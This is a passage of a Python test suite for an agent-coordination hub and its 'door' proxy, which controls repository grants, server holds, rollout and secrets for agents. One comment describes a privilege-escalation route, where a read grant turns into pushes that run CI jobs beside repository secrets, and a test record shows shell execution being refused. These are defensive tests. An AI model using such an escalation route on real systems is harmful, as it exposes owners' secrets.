            {"n": 1, "ts": 1.0, "caller": "vps", "target": "github:acme", "action": "repo-new", "kind": "rule",
             "outcome": "done", "why": "a new private repository", "made": "acme/newapp"},
            {"n": 2, "ts": 2.0, "caller": "vps", "target": "github:acme", "action": "repo-new", "kind": "rule",
             "outcome": "done", "why": "x", "made": "not a name"}], "last": 2})
        hub.DOOR.update(read_at=0.0, error=None)
        self.assertEqual(hub.door_sweep(t0=100.0), 2)
        self.assertEqual([r["made"] for r in hub.q("SELECT made FROM door_record ORDER BY n")], ["acme/newapp", None])
        team = self.origin_team()
        team["agents"]["studio"]["role"] = "worker"
        team["agents"]["vps"]["servers"] = {"web-1": "fix"}
        self.write_team(team)
        self.assertIsNone(hub.grant_check("studio", "repo:acme/NewApp", "write"))
        self.assertIn("at write at most", hub.grant_check("studio", "repo:acme/newapp", "deploy"))
        self.assertIn("holds a server through the door", hub.grant_check("vps", "repo:acme/newapp", "read"))
        self.assertIn("not in the grantable pool", hub.grant_check("studio", "repo:acme/other", "read"))
        # A repository that the fleet holds goes by the default at read, but the door commits for an Operator to each
        # repository that it holds, at any level (DoorAccess.operatorGitHub): only the owner's own level of write
        # opens it (the Door area's read of 26 November 2026). Bug: a default read to an Operator becomes the door's
        # commits, whose push the repository's jobs run beside their secrets.
        team["agents"]["studio"]["repos"] = {"acme/site": "read"}
        self.write_team(team)
        self.assertIsNone(hub.grant_check("studio", "repo:acme/site", "read"))
        said = hub.grant_check("vps", "repo:acme/site", "read")
        self.assertIn("only the owner's own level of write", said)
        # and it names the one route that settles it, so the manager does not loop between grant_access and a card:
        # the agent that holds it at that level does that part (card_access refuses the owner's card then), else the
        # owner's card for this agent (the coordinator's validator of 26 November 2026)
        self.assertIn("studio holds it at that level: give that part of the work to studio with create_task", said)
        self.assertNotIn("raise_needs_you", said)
        self.assertIsNotNone(hub.card_access("repo:acme/site", "read", agent="vps"))
        said = hub.grant_check("vps", "repo:acme/site", "write")
        self.assertIn('raise_needs_you(needs_access="repo:acme/site", needs_level="write", needs_agent="vps")', said)
        self.assertIsNone(hub.card_access("repo:acme/site", "write", agent="vps"))
        team["resources"] = {"repo:acme/site": {"max": "read"}}
        self.write_team(team)
        self.assertIn("only the owner's own level of write", hub.grant_check("vps", "repo:acme/site", "read"))
        # the pool that see_capacity shows names no agent that grant_check refuses
        def eligible():
            return {p["resource"]: p["eligible"] for p in hub.grant_pool(["studio", "vps"])}["repo:acme/site"]
        self.assertEqual(eligible(), ["studio"])
        team["resources"] = {"repo:acme/site": {"max": "write"}}
        self.write_team(team)
        self.assertIsNone(hub.grant_check("vps", "repo:acme/site", "read"))
        self.assertEqual(eligible(), ["studio", "vps"])

    def test_the_manager_reads_the_record(self):
        """Since 11 November 2026 the door calls no model: a call outside the rules is the agent's own call, and the
        manager's weekly read names whose it was."""
        hub.q("INSERT INTO door_record(n,ts,caller,target,action,kind,outcome,why) VALUES(1,?,?,?,?,?,?,?)",
              (hub.now(), "vps", "web-1", "install", "own", "done",
               "vps's own call, which it answers for: the host form install"))
        hub.q("INSERT INTO door_record(n,ts,caller,target,action,kind,outcome,why) VALUES(2,?,?,?,?,?,?,?)",
              (hub.now(), "vps", "web-1", "exec", "refused", "refused", "bash is a shell"))
        text = hub.t_see_history("manager", {"what": "door", "window": 7})
        self.assertIn("1 own done, 1 refused refused", text)
        self.assertIn("vps's own call: web-1 install (the host form install)", text)
        self.assertNotIn("judge", text)
        self.assertIn("refused: vps web-1 exec: bash is a shell", text)


class DoorCalls(Access):
    """The door as one more holder: the owner grants it a secret, the copy waits, and only the door's address gets it."""

    def setUp(self):
        super().setUp()
        team = self.origin_team()
        team["logins"] = {"bws://00000001-0000-4000-8000-000000000000": {
            "kind": "api_key", "env": "CLOUDFLARE_API_TOKEN", "title": "Cloudflare token"}}
        team["door"] = {"address": DOOR, "port": 8766}
        self.write_team(team)
        self.ref = "bws://00000001-0000-4000-8000-000000000000"

    @staticmethod
    def no_door_round(*started):
        """In this block no door round of the owner's Mac gives the door a change, until the test sets the Mac's word
        (DOOR_HELD); started: when the Mac's last rounds started (door_round_seen). The three are the hub's own lists,
        which other tests' reads of GET /ui/door fill."""
        stack = contextlib.ExitStack()
        stack.enter_context(patch.object(hub, "DOOR_ROUNDS", list(started)))
        stack.enter_context(patch.dict(hub.DOOR_HELD, {"at": None}))
        stack.enter_context(patch.object(hub, "DOOR_OLD_READS", []))
        return stack

    def test_the_owner_gives_the_door_a_secret_and_takes_it_back(self):
        status, receipt = self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        self.assertEqual((status, receipt.get("changed")), (200, True), receipt)
        self.assertEqual(self.origin_team()["door"]["secrets"], [self.ref])
        status, receipt = self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="read")
        self.assertEqual(status, 400)
        status, receipt = self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant=None)
        self.assertEqual((status, receipt.get("changed")), (200, True), receipt)
        self.assertNotIn("secrets", self.origin_team()["door"])

    def test_the_app_writes_the_door_s_entry_and_reads_what_keeps_the_door(self):
        """DevOps plan 13, item 1: the app writes the door's address when it finds the door by its tag, with no step of
        the owner's; GET /ui/door gives it back with the credentials and each agent's machine address."""
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        status, receipt = self.owner("/ui/door", address="127.0.0.21", port=8766)
        self.assertEqual((status, receipt.get("changed")), (200, True), receipt)
        door = self.origin_team()["door"]
        self.assertEqual((door["address"], door["port"], door["secrets"]), ("127.0.0.21", 8766, [self.ref]))
        self.assertEqual(self.owner("/ui/door", address="127.0.0.21", port=8766)[1].get("changed"), False)
        for bad in ({"address": "door"}, {"address": "127.0.0.21", "port": 0}, {"address": hub.TEAM["addresses"]["vps"]}):
            with self.subTest(bad=bad):
                self.assertEqual(self.owner("/ui/door", **bad)[0], 400)
        status, view = self.request("/ui/door?db=test-generation", source=OWNER)
        self.assertEqual(status, 200, view)
        self.assertEqual(view["door"], {"address": "127.0.0.21", "port": 8766})
        self.assertEqual((view["credentials"], view["agents"]["vps"]["address"]), ({}, hub.TEAM["addresses"]["vps"]))
        self.assertEqual(self.request("/ui/door?db=test-generation", source=DOOR)[0], 403)
        # plan 13, items 3 and 4: the key that the central vault holds under the name door, which the app compares
        # with the door's own and pins when it differs
        self.assertEqual((view["vault_pin"], view["vault_read"]), (None, hub.CENTRAL["status"] is not None))
        recipient = "age1" + "q" * 58
        with patch.dict(hub.CENTRAL, {"status": {"pins": {"door": {"recipient": recipient}, "worker-1": {}}}}):
            view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertEqual((view["vault_pin"], view["vault_read"]), (recipient, True))

    def test_a_key_saved_for_the_door_becomes_a_credential_of_its_rules(self):
        """DevOps plan 13, item 3: the card that asks for a key for the door names it in the door's rules; the owner's
        Save gives it to the door, and the hub keeps that name with the agent that asked, which the app writes into
        the door's access file. Taking the key back from the door ends the credential too. An owner whose PC cannot
        keep the door gets no such card (H2): its key would wait in team.json for a round that never comes."""
        with patch.object(hub, "owner_computer", lambda: {"kind": "windows", "label": "PC", "can": ["secrets"]}), \
                self.assertRaisesRegex(hub.ToolError, "its app cannot set up the door .* Leave door out"):
            hub.t_request_secret("manager", {"kind": "api_key", "env": "CLOUDFLARE_ACME_DOOR_TOKEN",
                                             "site": "https://api.cloudflare.com", "door": "Cloudflare:ACME",
                                             "why": "Acme's DNS through the door"})
        self.assertIsNone(hub.q1("SELECT id FROM needs WHERE kind='secret'"))
        said = hub.t_request_secret("manager", {"kind": "api_key", "env": "CLOUDFLARE_ACME_DOOR_TOKEN",
                                                "site": "https://api.cloudflare.com", "door": "Cloudflare:ACME",
                                                "why": "Acme's DNS through the door", "details": STEPS})
        nid = hub.q1("SELECT max(id) AS id FROM needs WHERE kind='secret'")["id"]
        self.assertIn(f"N-{nid}", said)
        spec = hub.need_secret(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))
        self.assertEqual((spec["give"], spec["door"]), ({"door": "use"}, "cloudflare:acme"))
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")     # the card's own steps
        status, answer = self.owner(f"/ui/needs/{nid}/secret", login=self.ref)
        self.assertEqual(status, 200, answer)
        self.assertIn("Saved for the door as cloudflare:acme", answer["answer"])
        self.assertEqual(self.origin_team()["door"]["credentials"], {"cloudflare:acme": {"secret": self.ref}})
        self.assertIn("No agent uses it yet, because no agent holds a server through the door", answer["answer"])
        self.grant(level="fix")
        with hub.LOCK:
            hub.save_door_credential("cloudflare:acme", self.ref, "vps")     # a holder's card names the holder
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["credentials"],
                         {"cloudflare:acme": {"secret": self.ref, "agents": ["vps"]}})
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant=None)
        self.assertNotIn("credentials", self.origin_team()["door"])
        for bad in ({"kind": "api_key", "env": "OTHER_DOOR_TOKEN", "door": "aws:acme"},
                    {"kind": "login", "site": "https://dash.cloudflare.com", "door": "cloudflare:acme"}):
            with self.subTest(bad=bad), self.assertRaisesRegex(hub.ToolError, "door's rules"):
                hub.t_request_secret("manager", dict(bad, why="a test"))
        team = json.loads(json.dumps(hub.TEAM))
        team["door"]["credentials"] = {"cloudflare:acme": {"secret": "bws://00000009-0000-4000-8000-000000000000"}}
        with self.assertRaisesRegex(ValueError, "a secret that the door holds"):
            hub.validate_door(team)

    def test_a_new_value_of_a_door_key_keeps_the_door_s_rules_and_its_answer_promises_no_time(self):
        """The owner types a new value of a door key that the door uses (request_secret with failed): it goes in the
        place of the old one under the same reference, and the door's rules keep the same name and the same agents,
        so no agent gets a key through the answer. The door takes the new value at its next fetch of its keys, so the
        answer never says "now": a call that the door refuses before then must not read as a fault of the value."""
        team = self.origin_team()
        team["logins"][self.ref]["env"] = "DOOR_BACKBLAZE_ACME_KEY"
        self.write_team(team)
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        self.grant(level="fix")
        with hub.LOCK:
            hub.save_door_credential("backblaze:acme", self.ref, "vps")
        rules = self.origin_team()["door"]
        read = {"replaces": True, "pins": {"door": {"recipient": "age1" + "q" * 58}},
                "grants": [{"login": self.ref, "agent": "door", "machine": "door"}]}
        with patch.dict(hub.CENTRAL, {"status": read, "read_at": hub.now(), "error": None}), \
                patch.object(hub, "save_door_credential", side_effect=AssertionError("a new value names nobody")):
            said = hub.t_request_secret("manager", {"failed": self.ref, "why": "Backblaze refuses the key",
                                                    "details": STEPS})
            nid = hub.q1("SELECT max(id) AS id FROM needs WHERE kind='secret'")["id"]
            self.assertIn(f"a new value of the API key DOOR_BACKBLAZE_ACME_KEY as N-{nid}", said)
            with hub.LOCK:
                self.assertTrue(hub.value_replaced(self.ref, "a" * 64, {"saved": "replaced"}))
            status, answer = self.owner(f"/ui/needs/{nid}/secret", login=self.ref)
        self.assertEqual(status, 200, answer)
        self.assertEqual(self.origin_team()["door"], rules)
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["credentials"],
                         {"backblaze:acme": {"secret": self.ref, "agents": ["vps"]}})
        self.assertIn(f"Replaced the value of the door's key backblaze:acme ({self.ref}): the door holds it, and no "
                      f"agent holds it. The door takes the new value at its next fetch of its keys", answer["answer"])
        self.assertNotRegex(answer["answer"], r"\bnow\b")

    def test_door_gitops_gives_operators_a_gitops_repository_through_the_door_and_no_grant(self):
        """DevOps plan X3: the manager's door_gitops names a GitOps repository, its caller workflow and the Operators
        that get it; GET /ui/door gives it to the app, which writes their targets. No GitHub grant comes with it."""
        base = {"repo": "acme/gitops", "sync": "argocd-sync.yml", "agents": ["vps"], "why": "plan X3"}
        # the door's file names an agent with a target only with its business, so only a holder of servers gets one
        with self.assertRaisesRegex(hub.ToolError, "vps holds no server through the door"):
            hub.t_door_gitops("manager", dict(base, request_id="gitops-test-0"))
        self.grant(level="fix")
        said = hub.t_door_gitops("manager", dict(base, request_id="gitops-test-1"))
        self.assertIn("vps gets acme/gitops through the door", said)
        # the door gets it only at the owner's Mac's next round, and the manager gives the work at once: a refusal
        # before that round read as a defect of Founderizer (18 November 2026, for a repository grant)
        self.assertIn("The door acts on this from the owner's Mac's next door round after the change, usually within "
                      "10 minutes while the Mac's app runs (", said)
        self.assertIn(hub.DOOR_EARLY_REFUSAL, said)
        want = {"acme/gitops": {"sync": "argocd-sync.yml", "agents": ["vps"]}}
        self.assertEqual(self.origin_team()["door"]["gitops"], want)
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["gitops"], want)
        self.grant(level=None)          # with no server it is no caller of the door: the app's view leaves it out
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["gitops"], {})
        self.assertEqual(self.origin_team()["door"]["gitops"], want)
        self.grant(level="fix")
        self.assertNotIn("acme/gitops", self.origin_team()["agents"]["vps"].get("repos") or {})
        self.assertEqual(hub.t_door_gitops("manager", dict(base, request_id="gitops-test-1")), said)
        self.assertIn("It was so already", hub.t_door_gitops("manager", dict(base, request_id="gitops-test-2")))
        # a rename names the agent anew in the door's lists, which validate_door checks against the agents
        team = json.loads(json.dumps(hub.TEAM))
        team["door"]["credentials"] = {"cloudflare:acme": {"secret": "bws://x", "agents": ["vps"]}}
        renamed = hub.renamed_team(team, "vps", "ops")
        self.assertEqual(renamed["door"]["gitops"]["acme/gitops"]["agents"], ["ops"])
        self.assertEqual(renamed["door"]["credentials"]["cloudflare:acme"]["agents"], ["ops"])
        renamed["door"].pop("credentials")
        hub.validate_door(renamed)
        said = hub.t_door_gitops("manager", dict(base, request_id="gitops-test-3", repo="Acme/GitOps", agents=[],
                                                 why="X3 moved"))
        self.assertIn("Nobody gets Acme/GitOps through the door. The door acts on this from the owner's Mac's next "
                      "door round", said)       # until then the Operator still gets it
        self.assertNotIn("gitops", self.origin_team()["door"])
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["gitops"], {})
        for bad in ({"repo": "acme"}, {"sync": "../x.yml"}, {"sync": "a/b.yml"}, {"sync": "sync"},
                    {"agents": ["nobody"]}, {"agents": ["vps", "vps"]}, {"agents": "vps"}, {"why": ""}):
            with self.subTest(bad=bad), self.assertRaises(hub.ToolError):
                hub.t_door_gitops("manager", dict(base, request_id="gitops-test-9", **bad))
        team = json.loads(json.dumps(hub.TEAM))
        for gitops in ({"acme/gitops": {"sync": "a/b.yml", "agents": ["vps"]}},
                       {"acme/gitops": {"sync": "s.yml", "agents": []}},
                       {"acme/gitops": {"sync": "s.yml", "agents": ["nobody"]}}):
            team["door"]["gitops"] = gitops
            with self.subTest(gitops=gitops), self.assertRaisesRegex(ValueError, "door.gitops"):
                hub.validate_door(team)

    def test_the_door_s_parts_go_on_the_first_server_then_on_the_others_after_door_rollout(self):
        """New-projects plan N8 (b): the app says what it did on each server (POST /ui/door/host); the manager hears
        once that the first server passed the door's own check, and door_rollout then lets the app go on."""
        def told(words):
            return [r["text"] for r in hub.q("SELECT text FROM events WHERE agent='manager' AND text LIKE ?",
                                             (f"%{words}%",))]
        view = self.request("/ui/door?db=test-generation", source=OWNER)[1]
        self.assertIs(view["rollout"], False)
        for state, said in (("installed", ""), ("passed", "")):
            status, got = self.owner("/ui/door/host", host="ci-1", state=state, said=said)
            self.assertEqual((status, got["changed"]), (200, True), got)
        self.assertEqual(len(told("call door_rollout with go true")), 1)
        self.assertIn("give door_hold to each server that a plan step keeps", told("call door_rollout")[-1])
        self.assertEqual(self.owner("/ui/door/host", host="ci-1", state="passed", said="")[1]["changed"], False)
        self.assertEqual(len(told("call door_rollout with go true")), 1)
        # the manager's resume names door_rollout until it is called (the coordinator: a tool no prompt names is
        # never used)
        self.assertEqual(hub.door_waits_after(), "ci-1")
        self.assertTrue(any("call door_rollout with go true" in line for line in hub.resume_lines(hub.now())))
        # the holds of plan steps: no parts and no grant, or rule calls only, which team.json and the app's view keep
        # under the old name judged, so that an app from before 11 November 2026 reads it as before
        said = hub.t_door_hold("manager", {"request_id": "hold-test-1", "host": "app-1", "hold": "parts",
                                           "why": "plan 2.23: the signing keys are there"})
        self.assertIn("gets no door parts", said)
        self.assertIn("until then it acts as before", said)     # agents still reach app-1 until the Mac's next round
        self.assertNotIn(hub.DOOR_EARLY_REFUSAL, said)          # and no word invites work on the server it keeps
        said = hub.t_door_hold("manager", {"request_id": "hold-test-2", "host": "Web-9", "hold": "rule-only",
                                           "why": "2.14"})
        self.assertIn("only rule calls run there through the door", said)
        self.assertNotIn("judge", said)
        self.assertEqual(self.origin_team()["door"]["holds"], {"app-1": "parts", "web-9": "judged"})
        self.assertEqual(self.request("/ui/door?db=test-generation", source=OWNER)[1]["holds"],
                         {"app-1": "parts", "web-9": "judged"})
        said = hub.t_door_hold("manager", {"request_id": "hold-test-4", "host": "web-9", "hold": "judged",
                                           "why": "2.14"})     # the old name, from a session of before
        self.assertIn("It was so already", said)
        hub.validate_door(json.loads(json.dumps(self.origin_team())))
        self.grant(server="web-9", level="fix")             # vps holds web-9, as the app records its Operator
        with self.no_door_round():                          # no door round gives the door the change
            said = hub.t_door_hold("manager", {"request_id": "hold-test-3", "host": "web-9", "hold": "none",
                                               "why": "2.14 passed"})
            # a later question about web-9 is answered from team.json, which has no hold now, while the door keeps the
            # old hold until its round: the line sent a restart, which met the same refusal, with no word of that round
            line = hub.access_route("vps", "server:web-9", "manager", "fix")
            self.assertIn("team.json gives it at fix already. The hold of web-9 changed ", line)
            self.assertNotIn("restart_task", line)          # and no restart: ops sends no credential
            self.assertNotIn("from parts", line)            # web-9 kept its parts
            self.assertIn("Until then it acts on the old hold, also for a session that starts again before then. " +
                          hub.DOOR_EARLY_REFUSAL + " " + hub.DOOR_HOLD_ANSWER, line)
        # the Operator's own calls there wait for the Mac's round, and its task says so; web-9 kept its parts
        self.assertIn(hub.DOOR_EARLY_REFUSAL + " " + hub.DOOR_EARLY_TASK, said)
        self.assertNotIn("door parts are in place", said)
        self.assertEqual(self.origin_team()["door"]["holds"], {"app-1": "parts"})
        # a parts hold kept the parts off, so the door takes the server only after the app put them there, one step a
        # round and past the first server only after door_rollout: "the next round" would make a later refusal a defect
        with self.no_door_round():
            said = hub.t_door_hold("manager", {"request_id": "hold-test-5", "host": "app-1", "hold": "rule-only",
                                               "why": "plan 2.23 is done"})
            line = hub.access_route("vps", "server:app-1", "manager", "fix")     # the same, for a later question
            # and a second change before a round: the door may still have no parts there
            again = hub.t_door_hold("manager", {"request_id": "hold-test-6", "host": "app-1", "hold": "none",
                                                "why": "and its rule calls are done"})
            self.assertIn("If they are not, the app puts them there first", again)
            self.assertIn("The hold of app-1 changed from parts ", hub.access_route("vps", "server:app-1", "manager"))
        self.assertIn("The hold of app-1 changed from parts ", line)
        self.assertIn("and the hub records its holder then; if they are not, the app puts them there first", line)
        self.assertIn("If they are not, the app puts them there first, one step a round (their install, then the "
                      "door's own check), and past the first server only after door_rollout. " +
                      hub.DOOR_EARLY_REFUSAL + " " + hub.DOOR_EARLY_TASK, said)
        for bad in ({"host": "app-1", "hold": "all"}, {"host": "a b", "hold": "parts"}):
            with self.subTest(bad=bad), self.assertRaises(hub.ToolError):
                hub.t_door_hold("manager", dict(bad, request_id="hold-test-9", why="a test"))
        for bad in ({"host": "Bad Name", "state": "passed"}, {"host": "ci-1", "state": "done"},
                    {"host": "ci-1", "state": "failed", "said": "two\nlines"}):
            with self.subTest(bad=bad):
                self.assertEqual(self.owner("/ui/door/host", **bad)[0], 400)
        with self.assertRaisesRegex(hub.ToolError, "go is true"):
            hub.t_door_rollout("manager", {"request_id": "rollout-test-1", "go": "yes", "why": "test 6 passed"})
        said = hub.t_door_rollout("manager", {"request_id": "rollout-test-2", "go": True, "why": "test 6 passed on ci-1"})
        self.assertIn("one each round", said)
        self.assertIs(self.origin_team()["door"]["rollout"], True)
        self.assertIs(self.request("/ui/door?db=test-generation", source=OWNER)[1]["rollout"], True)
        self.assertEqual(hub.t_door_rollout("manager", {"request_id": "rollout-test-2", "go": True, "why": "test 6 passed on ci-1"}),
                         said)                                       # the same request, the same answer
        self.owner("/ui/door/host", host="web-9", state="passed", said="")
        self.assertEqual(len(told("call door_rollout with go true")), 1)   # only the first server's
        self.owner("/ui/door/host", host="web-9", state="failed", said="install.sh: port 2244 is in use on this host")
        self.assertIn("port 2244 is in use", told("did not go on web-9")[-1])
        hub.t_door_rollout("manager", {"request_id": "rollout-test-3", "go": False, "why": "a failure on web-9"})
        self.assertNotIn("rollout", self.origin_team()["door"])
        self.assertIsNone(hub.door_waits_after())
        team = json.loads(json.dumps(hub.TEAM))
        team["door"]["rollout"] = "yes"
        with self.assertRaisesRegex(ValueError, "door.rollout is true or false"):
            hub.validate_door(team)
        team["door"]["rollout"] = True
        team["door"]["holds"] = {"app-1": "everything"}
        with self.assertRaisesRegex(ValueError, "door.holds maps"):
            hub.validate_door(team)

    def test_a_check_with_no_step_tells_the_manager_once_for_each_cause_and_tells_its_end(self):
        """API 1.241: the app's word unchecked (the door's check of a server made no step in three rounds in a row)
        tells the manager what to do, once for each cause, and the pass after it tells the manager too, so that a step
        taken for it (a policy line, a card) has its end. On 18 and 19 November 2026 a server waited 21 hours in
        silence, and two servers behind it."""
        def told(words):
            return [r["text"] for r in hub.q("SELECT text FROM events WHERE agent='manager' AND text LIKE ?",
                                             (f"%{words}%",))]
        hub.t_door_rollout("manager", {"request_id": "rollout-unchecked-1", "go": True, "why": "test 6 passed"})
        cause = "the door's connection to port 2244 timed out"
        for state, said in (("installed", ""), ("unchecked", cause)):
            status, got = self.owner("/ui/door/host", host="web-9", state=state, said=said)
            self.assertEqual((status, got["changed"]), (200, True), got)
        line = told("has not checked web-9")
        self.assertEqual(len(line), 1)
        self.assertIn(f"[hub] The door has not checked web-9 yet: {cause}. The app tries again each round, and the "
                      f"servers after it in the order wait.", line[0])
        self.assertIn("the tailnet policy", line[0])
        self.assertIn("door_hold web-9 with hold parts lets the other servers go on", line[0])
        self.assertEqual(self.owner("/ui/door/host", host="web-9", state="unchecked", said=cause)[1]["changed"],
                         False)
        self.assertEqual(len(told("has not checked web-9")), 1)         # the same cause again: no second line
        self.owner("/ui/door/host", host="web-9", state="unchecked",
                   said="port 2244 of the host refused the door's connection")
        self.assertEqual(len(told("has not checked web-9")), 2)         # a new cause: one more line
        self.owner("/ui/door/host", host="web-9", state="passed", said="")
        self.assertEqual(len(told("The door's check of web-9 passed, after it had made no step")), 1)
        self.owner("/ui/door/host", host="web-8", state="failed", said="the door's check failed: no TTY")
        self.owner("/ui/door/host", host="web-8", state="passed", said="")
        self.assertEqual(len(told("The door's check of web-8 passed, after it failed")), 1)
        self.owner("/ui/door/host", host="web-7", state="installed", said="")
        self.owner("/ui/door/host", host="web-7", state="passed", said="")
        self.assertEqual(told("check of web-7 passed"), [])                 # a plain pass, past the first server

    def test_a_key_for_an_app_s_setting_keeps_the_setting_s_name(self):
        """New-projects plan N4: a key card for app:<app>:<NAME> keeps NAME in its own case, because the app reads
        that name, and its answer says which door form puts it in the app's settings."""
        said = hub.t_request_secret("manager", {"kind": "api_key", "env": "STRIPE_SECRET_KEY",
                                                "site": "https://api.stripe.com", "door": "app:Shop:STRIPE_SECRET_KEY",
                                                "why": "the shop's payments", "details": STEPS})
        nid = hub.q1("SELECT max(id) AS id FROM needs WHERE kind='secret'")["id"]
        self.assertIn(f"N-{nid}", said)
        spec = hub.need_secret(hub.q1("SELECT * FROM needs WHERE id=?", (nid,)))
        self.assertEqual(spec["door"], "app:shop:STRIPE_SECRET_KEY")
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        self.grant(level="fix")         # vps holds the servers, alone: the manager's key is for it
        status, answer = self.owner(f"/ui/needs/{nid}/secret", login=self.ref)
        self.assertEqual(status, 200, answer)
        self.assertIn("The door uses it for vps from the owner's Mac's next door round", answer["answer"])
        self.assertIn("`ops <host> env-new shop STRIPE_SECRET_KEY key` puts it in the app's settings",
                      answer["answer"])
        self.assertEqual(self.origin_team()["door"]["credentials"],
                         {"app:shop:STRIPE_SECRET_KEY": {"secret": self.ref, "agents": ["vps"]}})
        hub.validate_door(json.loads(json.dumps(hub.TEAM)))
        for bad in ("app:shop:stripe_key", "app:shop", "app:1shop:KEY", "app:shop:KEY:MORE"):
            with self.subTest(bad=bad), self.assertRaisesRegex(hub.ToolError, "app:<app>:<NAME>"):
                hub.t_request_secret("manager", {"kind": "api_key", "env": "OTHER_KEY", "door": bad,
                                                 "site": "https://api.stripe.com", "why": "a test"})

    def test_the_tool_says_which_cloudflare_key_to_ask_for_and_the_card_keeps_the_asker_s_words(self):
        """12 November 2026 (the owner, to a card that listed seven rights: "why do I have to do that?"): the key of a
        Cloudflare account of the door is one that only makes tokens, given one time, and the door makes its own work
        key from it. The tool tells each asker which key that is, and the card is the asker's own words: the owner
        chose no fixed words for it ("No fixed steps"). Since 20 November 2026 (the owner, of such a card with no
        address: "also when possible these tasks should include specific links") the tool gives the address of
        Cloudflare's own form for that key, which comes with the key's two permissions, and the card keeps it. A
        request with no steps is refused with those words (F18), and raises no card; for another provider with the
        door's own words, which end in a full stop, the refusal ends in one, and it names no door name of the caller."""
        form = urllib.parse.urlsplit(hub.CLOUDFLARE_KEY_FORM)
        asked = urllib.parse.parse_qs(form.query)
        self.assertEqual((form.scheme, form.netloc, asked["to"]), ("https", "dash.cloudflare.com",
                                                                    ["/:account/api-tokens"]))
        self.assertEqual((form.path, sorted(asked)), ("/", ["name", "permissionGroupKeys", "to"]))   # the name too
        self.assertEqual(json.loads(asked["permissionGroupKeys"][0]),
                         [{"key": "account_api_tokens", "type": "edit"}, {"key": "account_settings", "type": "read"}])
        doors = [json.dumps(t[4]["properties"]["door"]) for t in hub.TOOLS if t[1] == "request_secret"]
        self.assertEqual(len(doors), 2)                                 # the manager's entry, and a worker's
        for words in doors:
            for part in ("only makes tokens", "one time for that account", "Account API Tokens: Edit",
                         "Account Settings: Read", "no end date", "Ask for no other permission",
                         hub.CLOUDFLARE_KEY_FORM, "with nothing changed", "with that full address"):
                self.assertIn(part, words)
        ask = {"kind": "api_key", "site": "https://api.cloudflare.com", "why": "Acme's DNS through the door"}
        with self.assertRaises(hub.ToolError) as none:         # no steps: the refusal gives the form's address (F18)
            hub.t_request_secret("manager", dict(ask, door="cloudflare:acme"))
        self.assertIn("An API key needs details: how the owner makes or finds it", str(none.exception))
        self.assertIn(f" For this key: {hub.DOOR_CLOUDFLARE_KEY}.", str(none.exception))
        self.assertIn(hub.CLOUDFLARE_KEY_FORM, str(none.exception))
        for door in ("backblaze:zq9", "hetzner:zq9", "tailscale:zq9"):
            with self.subTest(door=door):
                with self.assertRaises(hub.ToolError) as none:
                    hub.t_request_secret("manager", dict(ask, door=door))
                said = str(none.exception)
                self.assertIn(" For this key: " + hub.door_key_words(door).rstrip("."), said)
                self.assertTrue(said.endswith(".") and not said.endswith(".."), said)
                self.assertNotIn("zq9", said)
        self.assertFalse(hub.q("SELECT 1 FROM needs WHERE kind='secret'"))
        details = f"One key that only makes tokens, on {hub.CLOUDFLARE_KEY_FORM} in Acme's account."
        hub.t_request_secret("manager", dict(ask, door="cloudflare:acme", details=details))
        row = hub.q1("SELECT why, details FROM needs WHERE kind='secret' ORDER BY id DESC LIMIT 1")
        self.assertEqual((row["why"], row["details"]), ("Acme's DNS through the door", details))

    def door_key(self, name="cloudflare:acme", users=None):
        """The door holds self.ref under this name of its rules, for these agents."""
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        team = self.origin_team()
        team["door"]["credentials"] = {name: dict({"secret": self.ref}, **({"agents": users} if users else {}))}
        self.write_team(team)

    def test_only_a_holder_of_servers_uses_a_key_of_the_door(self):
        """The review of 11 November 2026: the door's file names an agent with a provider only with its business, so
        a key for an agent that holds no server made a file that the door refused whole. A worker that holds none is
        refused, with the agent that holds the servers; the manager's card goes to the one holder, the manager
        itself when it holds them; with two holders it stays with nobody until one of them asks."""
        ask = {"kind": "api_key", "site": "https://api.cloudflare.com", "door": "cloudflare:acme", "why": "DNS",
               "task_id": None}
        with patch.object(hub, "chat_context", return_value=False), \
                patch.object(hub, "contact_session", return_value=False), \
                patch.object(hub, "parse_task", return_value=None):
            with self.assertRaisesRegex(hub.ToolError, "No agent holds a server through the door yet"):
                hub.t_request_secret("vps", dict(ask))
            self.grant(agent="studio", server="web-2", level="fix")
            with self.assertRaisesRegex(hub.ToolError, "studio holds the servers: ask your requester"):
                hub.t_request_secret("vps", dict(ask))
        self.assertFalse(hub.q("SELECT 1 FROM needs WHERE kind='secret'"))
        self.owner("/ui/secrets/grant", login=self.ref, agent="door", grant="use")
        with hub.LOCK:
            hub.save_door_credential("cloudflare:acme", self.ref, "manager")    # one holder: the manager's key is its
        self.assertEqual(self.origin_team()["door"]["credentials"]["cloudflare:acme"]["agents"], ["studio"])
        self.grant(agent="manager", server="web-1", level="fix")
        with hub.LOCK:
            hub.save_door_credential("cloudflare:two", self.ref, "manager")     # the manager holds servers: its own
            hub.save_door_credential("cloudflare:three", self.ref, "leadless")  # two holders, and the asker is none
        credentials = self.origin_team()["door"]["credentials"]
        self.assertEqual(credentials["cloudflare:two"]["agents"], ["manager"])
        self.assertNotIn("agents", credentials["cloudflare:three"])

    def test_with_several_holders_the_manager_names_the_one_that_a_key_is_for(self):
        """Two agents hold servers, as in a fleet with two businesses. No agent takes a key of the door by asking for
        it: the manager names the holder in give_to, for a new card and for a key that the door holds for nobody,
        which then needs nothing typed. A key that the door uses for one agent stays that agent's: the work goes to
        it, as for a server. An agent that lost its last server keeps its name in team.json and leaves the app's view."""
        self.grant(level="fix")
        self.grant(agent="studio", server="web-2", level="fix")
        self.door_key()
        ask = {"kind": "api_key", "site": "https://api.cloudflare.com", "door": "cloudflare:acme", "why": "DNS",
